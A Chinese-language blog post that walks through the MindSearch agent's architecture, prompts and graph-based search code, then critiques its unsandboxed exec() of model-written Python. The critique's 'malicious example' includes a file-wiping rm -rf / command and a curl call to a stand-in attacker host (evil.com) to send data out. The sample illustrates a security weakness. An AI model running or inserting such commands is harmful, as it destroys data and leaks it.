---
title: "2025-07-17 拆解Agent项目：MindSearch"
date: 2025-12-05T13:54:40.565001
tags: ['tech']
description: ""
---

最近开始整理 Agent 项目，打算了解一下项目背后的思路，拓宽一下视野。



项目地址：https://github.com/InternLM/MindSearch

这个项目的核心理念是让AI将复杂问题分解为多个子问题，并行搜索获取信息，最后综合所有信息给出完整答案。

# 项目架构

## 1. 核心组件结构

```plain text
MindSearch/
├── mindsearch/           # 核心AI agent模块
│   ├── agent/           # 智能体实现
│   ├── app.py          # FastAPI后端服务
│   └── terminal.py     # 命令行接口
├── frontend/           # 前端界面
│   ├── React/         # React前端
│   ├── gradio_agentchatbot/  # Gradio组件
│   └── streamlit前端
└── docker/            # Docker部署工具

```

## 2. 技术栈

- 后端 : FastAPI + Python
- AI框架 : Lagent (基于InternLM)
- 前端 : React + TypeScript + Vite
- UI组件 : Antd + ReactFlow (用于可视化搜索图)
- 搜索引擎 : 支持多种搜索API (Bing, Google, DuckDuckGo等)
# 核心工作原理

## 1. MindSearch Agent (mindsearch_agent.py)

### 主要功能

- 问题分解 : 将复杂问题分解为多个可搜索的子问题
- 并行搜索 : 同时执行多个搜索任务
- 信息整合 : 将搜索结果整理成“参考资料”，再让大模型根据这些资料生成最终答案。
- 流式输出 : 实时返回搜索进度和结果
### 模块解析

### 前置类型和工具

1. AgentMessage, AgentStatusCode, ModelStatusCode
来自 lagent.schema，用来描述“对话中的一条消息”及其“状态码”。
1. GeneratorWithReturn
来自 lagent.utils，是一个“既能迭代又能在最后拿返回值”的生成器包装器。
这里用来执行 self.action.run(...)，既能实时产出中间消息，又能在结束时拿到完整的图数据。
1. ExecutionAction, WebSearchGraph
来自本地模块 .graph。
### 两个小工具函数

1. _update_ref(ref, ref2url, ptr)
把一段文字里的“[[数字]]”引用标记重新编号，并同步更新 ref2url。
举例：
```plain text
ref  = "根据 [[3]] 和 [[5]] 的结论..."
ptr  = 7
输出 = "根据 [[8]] 和 [[9]] 的结论..." ，
并把 ref2url 中 3、5 对应的 url 映射到 8、9。

```

返回值：更新后的文本、更新后的 url 映射、本次新增了多少个引用。

1. _generate_references_from_graph(graph)
把搜索图里每个节点（子问题）的结果拼成一段“参考资料”文本和 url 映射字典。
每个节点只取 memory 中第 3 条消息（索引=2）的内容作为搜索结果，因为那里固定是 ActionExecutor 返回的 json 字符串：{ref_id: url}。
### 主类：MindSearchAgent

1. 构造函数
1. forward(message, session_id=0, **kwargs)
这就是“入口函数”，调用方每发一个用户消息就进来一次。整体流程：
## 2. MindSearch Engine(graph.py)

### 主要功能

这段代码有两个功能：

1. 把“搜索子问题”真正扔到后台去跑（WebSearchGraph）。
1. 让 Planner 写的 Python 代码能调用这张图（ExecutionAction）。
### 模块解析

### SearcherAgent

作用：把单个子问题包装成一条完整 prompt，送给大模型 + 搜索插件。

- 只负责“一个问题”的搜索，不拆问题，也不建图。
- 与 Planner 的分工：Planner 决定“问什么”，SearcherAgent 负责“怎么搜”。
模板拼接逻辑

```plain text
message = user_input_template.format(question=..., topic=...)
↓
如果 history 有值，再把历史 QA 用 user_context_template 贴到前面
↓
交给父类 StreamingAgentForInternLM / AsyncStreamingAgentForInternLM 进行流式对话

```

父类（StreamingAgentForInternLM）会：

- 调用搜索插件 FastWebBrowser
- 逐句 yield 搜索结果
- 结束时把整条回答放进 response 字段，把对话记忆放进 memory 字段。
### WebSearchGraph——可并发的搜索图

数据结构

```plain text
nodes: dict[str, dict]      # 节点信息（内容 / 类型 / 回答 / 记忆）
adjacency_list: dict[str, list[dict]]  # 边，带 state 1/2/3（进行中/未开始/已结束）
future_to_query: dict[Future, str]     # 正在跑的后台任务
searcher_resp_queue: Queue # 生产者-消费者队列，给ExecutionAction 用
executor: ThreadPoolExecutor           # 线程池（同步模式）

```

类变量

```plain text
is_async           # 是否启用 asyncio
SEARCHER_CONFIG    # SearcherAgent 的初始化参数
_SEARCHER_LOOP     # asyncio 事件循环列表（async 模式）
_SEARCHER_THREAD   # 每个 loop 对应的后台线程

```

关键方法

1. add_root_node
单纯记录根节点，无搜索。
1. add_node(node_name, node_content)
1. add_edge(start, end)
加边，并立即往队列 put 一条 (start_node, node_info, adjacency_list) 供前端更新 UI。
1. add_response_node
标记结束节点，同样 put 一条消息。
1. reset
清空图。
1. start_loop(n)（类方法）
当 is_async=True 时，提前在后台开 n 个线程，每个线程跑一个独立 asyncio loop，供 add_node 随时投异步任务。
### ExecutionAction——Planner 的“执行器”

Planner 会生成一段 Python 代码，形如：

```plain text
graph = WebSearchGraph()
graph.add_root_node("哪家大模型API最便宜？")
graph.add_node("大模型API提供商", "目前有哪些主要的大模型API提供商？")
graph.add_node("OpenAI价格", "OpenAI 的 GPT-4 最新价格是多少？")
graph.add_edge("root","大模型API提供商")
...
graph.node("大模型API提供商")

```

ExecutionAction 负责：

1. extract_code：
把 Planner 返回的 markdown 里 python ```  或 ``` 中的代码抠出来。
1. exec：
在传入的 global / local 命名空间里跑这段代码，于是 graph 对象就在 local_dict 里生成了。
1. 消费队列：
只要 n_active_tasks > 0，就不断从 searcher_resp_queue 取结果：
1. 当所有任务完成后，把代码里出现的 graph.node(...) 对应的节点信息收集起来，返回 (res, graph.nodes, graph.adjacency_list) 给 Planner 做下一步决策或生成最终答案。
### 流程

1. Planner 生成代码 → graph.add_node("xxx", "子问题")
1. WebSearchGraph 启动 SearcherAgent
1. SearcherAgent.forward → 父类 StreamingAgentForInternLM
1. 父类让大模型写 <|plugin|>{"name":"FastWebBrowser.search",...}
1. 父类解析 JSON → 调用 FastWebBrowser.search → 逐句 yield 搜索结果
1. 最终结果写进 node["response"] 和 node["memory"]
WebSearchGraph 通过 SearcherAgent 把每个子问题真正搜索完成。
ExecutionAction 负责把实时结果流回 Planner。
Planner 再根据结果决定继续拆问题还是直接汇总。

## 3. MindSearch Prompt(mindsearch_prompt.py)

这个模块负责两级思考链路：

1. 第一级：Planner（用 GRAPH_PROMPT）
负责“如何拆问题 → 建图 → 决定搜索哪些子问题”。
1. 第二级：Searcher（用 searcher_system_prompt）
负责“针对一个原子化的子问题，真正去搜索网页，并给出带引用的答案”。
### Planner 的工作流程（GRAPH_PROMPT）

1. 目标
把一个复杂提问拆成可以并行/串行搜索的单知识点子问题，用 WebSearchGraph 构造有向无环图，最终汇总成答案。
1. 关键约束
1. 示例执行顺序（对应 graph_fewshot_example_cn）
```plain text
graph = WebSearchGraph()
graph.add_root_node("哪家大模型API最便宜?","root")
graph.add_node("大模型API提供商", "目前有哪些主要的大模型API提供商？")
graph.add_node("OpenAI价格", "OpenAI 的 GPT-4 最新价格是多少？")
graph.add_node("Claude价格", "Claude 3.5 Sonnet 最新价格是多少？")
graph.add_edge("root","大模型API提供商")
graph.add_edge("大模型API提供商","OpenAI价格")
graph.add_edge("大模型API提供商","Claude价格")
graph.node("大模型API提供商")  # 触发搜索并看到结果

```

LLM 拿到搜索结果后，再决定是继续拆，还是直接 add_response_node 汇总。

### Searcher 的工作流程（searcher_system_prompt）

1. 目标
针对 Planner 给出的“当前问题”，真正调用搜索工具，返回带索引引用的简洁答案，以便 Planner 后续拼装。
1. 工具
1. 思考-行动格式
我的思考……<|action_start|><|plugin|>{"name":"FastWebBrowser.search", "parameters":{...}}<|action_end|>

1. 引用规范
答案中每句关键信息后面加 [[idx]]，idx 与搜索结果里的 id 对应。
示例：
截至 2024-07，OpenAI GPT-4 的定价为 $0.06 / 1k tokens [[0]]。

1. 历史问题拼接
如果 Planner 给 Searcher 的 prompt 里还带了“历史问题/回答”，Searcher 会把它们放在某个区块里，方便在先前基础上追问，避免重复搜索。


### 模板变量如下

### 流程

1. Planner 收到用户问题 → 拆成 sub_questions → 调用 graph.add_node 触发搜索。
1. Searcher 收到 sub_question → 调用浏览器 → 返回带引用的 answer。
1. Planner 把 answer 填回图 → 判断是否继续拆 or 直接 add_response_node。
1. 最终 Planner 调用 add_response_node，把整图所有问答对拼给大模型，用 FINAL_RESPONSE_CN/EN 模板生成“最终完整答案”。
# 可以改进的地方

### 1. exec的使用会带来安全问题

在"graph.py" 中的代码有如下代码：

```plain text
def run(self, command, local_dict, global_dict, stream_graph=False):
    def extract_code(text: str) -> str:
        text = re.sub(r"from ([\w.]+) import WebSearchGraph", "", text)
        # ... existing code ...
        return text

    command = extract_code(command)
    exec(command, global_dict, local_dict)  # 🚨 直接执行任意代码

```

问题分析：

- 任意代码执行: 直接执行从LLM生成的Python代码，没有任何安全限制
- 全局命名空间污染: 使用globals()作为执行环境，可能影响整个程序状态
- 系统调用风险: 恶意代码可以执行系统命令、文件操作、网络请求等
### 2. 代码提取机制不够安全

```plain text
def extract_code(text: str) -> str:
    text = re.sub(r"from ([\w.]+) import WebSearchGraph", "", text)
    triple_match = re.search(r"```[^\n]*\n(.+?)```", text, re.DOTALL)
    single_match = re.search(r"`([^`]*)`", text, re.DOTALL)
    if triple_match:
        return triple_match.group(1)
    elif single_match:
        return single_match.group(1)
    return text

```

问题：

- 简单的正则过滤: 只是移除了WebSearchGraph的import，但没有限制其他危险操作
- 回退机制: 如果没有匹配到代码块，直接返回原文本执行
### 3. 缺乏代码沙箱

当前实现没有任何沙箱机制：

- 没有限制可用的模块和函数
- 没有限制文件系统访问
- 没有限制网络访问
- 没有资源使用限制（CPU、内存、时间）
### 4. 潜在的注入攻击

恶意用户可能通过精心构造的输入来执行危险代码：

```plain text
# 恶意示例
"""
graph = WebSearchGraph()
import os
os.system("rm -rf /")  # 删除系统文件
import subprocess
subprocess.run(["curl", "evil.com/steal_data"])  # 数据泄露
"""

```

## 替代方案

1. 使用AST解析和白名单

2. 使用受限的执行环境

3. 使用专门的沙箱库

4. 避免动态代码

# 其他

## 图的概念

这里用到的“图”其实是一张「问题拆解 + 搜索结果」的流程图——节点就是“要解决的小问题”，边表示“先解决谁，再解决谁”。

1. 图长什么样？
```plain text
边（箭头）只表示“依赖”或“顺序”：

root → 子问题1 → 子问题2 → response
      ↘ 子问题3 ↗

如果子问题之间没有依赖，可以并列：

root → A
root → B
A、B → response

```



2. 图在代码里怎么表示？

- nodes：字典
key 是节点名字，value 里存“问题内容 / 搜到的答案 / 对话记忆”。
- adjacency_list：字典
key 是起始节点，value 是一个列表，列表里每个元素是“一条箭头”指向谁。
```plain text
nodes = {
  "root": {"content":"哪家大模型API最便宜？"},
  "provider": {"content":"有哪些大模型API？"},
  "price": {"content":"OpenAI价格？"}
}
adjacency_list = {
  "root": [{"id":"...", "name":"provider"}],
  "provider": [{"id":"...", "name":"price"}]
}

```



1. 图有什么用？


 